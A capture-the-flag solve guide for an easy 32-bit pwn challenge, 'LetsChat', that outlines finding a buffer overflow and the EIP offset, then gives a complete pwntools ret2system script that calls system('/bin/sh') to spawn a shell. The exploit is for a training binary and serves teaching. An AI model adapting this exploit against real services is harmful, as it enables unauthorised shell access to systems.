# [Easy] Pwn - LetsChat - Solve Guide

## Overview
The player is provided with only the challenge binary. The aim is to reverse the binary, find the vulnerability, locate the required gadgets/strings, and exploit the vulnerability to spawn a shell.

## Steps
Disassemble the binary and locate that there is a buffer overflow when choosing the **Leave Rating** option.

Locate the offset until overwriting the **EIP** using GDB and a cyclic pattern.

Locate the address of the '/bin/sh' string within the binary as well as the address of system@PLT.

Build a ROP chain to overflow the buffer and return to system@PLT with the argument '/bin/sh' to spawn a shell.

## Scripts Used
```
from pwn import *

context.binary = binary = ELF("./binary", checksec=False)

bin_sh = p32(next(binary.search(b"/bin/sh")))
system = p32(binary.plt["system"])

offset = 124
buffer = b"A"*offset
buffer += system    # Address of system@PLT
buffer += b"BBBB"
buffer += bin_sh    # Address of '/bin/sh' string

p = binary.process()
#p = remote("REMOTE-HOST", REMOTE-PORT)

p.sendlineafter(b">> ", b"99")
p.sendlineafter(b": ", buffer)
p.interactive()
```